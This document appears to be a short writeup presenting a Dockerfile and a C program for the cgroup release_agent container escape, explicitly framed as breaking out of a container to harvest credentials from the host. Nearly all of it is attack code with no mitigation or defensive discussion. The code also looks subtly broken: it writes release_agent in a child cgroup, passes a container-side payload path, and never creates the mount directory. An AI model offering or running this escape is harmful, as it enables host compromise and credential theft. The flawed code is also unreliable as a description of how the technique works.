### Cgroup Release Agent Container Escape Technique

The cgroup release_agent container escape is a known technique that exploits the way the Linux kernel handles cgroups. The Dockerfile below creates a container that attempts to exploit this vulnerability to escape the container and harvest credentials from the host.

#### Dockerfile

```dockerfile
# Use an Ubuntu base image for compatibility with the cgroup release_agent exploit
FROM ubuntu:22.04

# Install necessary packages
RUN apt update && apt install -y libcap-dev

# Copy the exploit binary into the container
COPY release_agent_exploit /release_agent_exploit

# Make the exploit binary executable
RUN chmod +x /release_agent_exploit

# Set the command to run when the container starts
CMD ["/release_agent_exploit"]
```

#### Exploit Binary (`release_agent_exploit`)

To create the `release_agent_exploit` binary, you will need to compile a C program that implements the cgroup release_agent exploit. Below is an example C program that demonstrates this.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>

#define RELEASE_AGENT "/tmp/release_agent.sh"
#define CGROUP_PATH "/tmp/cgrp"

void create_release_agent() {
    FILE *fp = fopen(RELEASE_AGENT, "w");
    if (fp == NULL) {
        perror("fopen");
        exit(1);
    }
    // Example payload: harvest credentials by writing to a file on the host
    fprintf(fp, "#!/bin/sh\nps aux > /tmp/harvested_creds\n");
    fclose(fp);
    chmod(RELEASE_AGENT, 0777);
}

void setup_cgroup() {
    // Create a new cgroup mount point
    if (mount("cgroup", CGROUP_PATH, "cgroup", 0, "rdma") != 0) {
        perror("mount");
        exit(1);
    }

    // Create a new cgroup
    char path[256];
    snprintf(path, sizeof(path), "%s/escape", CGROUP_PATH);
    mkdir(path, 0777);

    // Write the release_agent path
    char release_agent_path[256];
    snprintf(release_agent_path, sizeof(release_agent_path), "%s/release_agent", path);
    FILE *fp = fopen(release_agent_path, "w");
    if (fp == NULL) {
        perror("fopen release_agent");
        exit(1);
    }
    fprintf(fp, "%s", RELEASE_AGENT);
    fclose(fp);

    // Notify on release
    char notify_on_release_path[256];
    snprintf(notify_on_release_path, sizeof(notify_on_release_path), "%s/notify_on_release", path);
    fp = fopen(notify_on_release_path, "w");
    if (fp == NULL) {
        perror("fopen notify_on_release");
        exit(1);
    }
    fprintf(fp, "1");
    fclose(fp);

    // Create a new process in the cgroup and then kill it to trigger release_agent
    pid_t pid = fork();
    if (pid == 0) {
        // Child process: move to the cgroup and exit
        char cgroup_procs_path[256];
        snprintf(cgroup_procs_path, sizeof(cgroup_procs_path), "%s/cgroup.procs", path);
        fp = fopen(cgroup_procs_path, "w");
        if (fp == NULL) {
            perror("fopen cgroup.procs");
            exit(1);
        }
        fprintf(fp, "%d", getpid());
        fclose(fp);
        exit(0);
    } else {
        // Parent process: wait for the child to exit and trigger release_agent
        wait(NULL);
    }
}

int main() {
    create_release_agent();
    setup_cgroup();
    return 0;
}
```

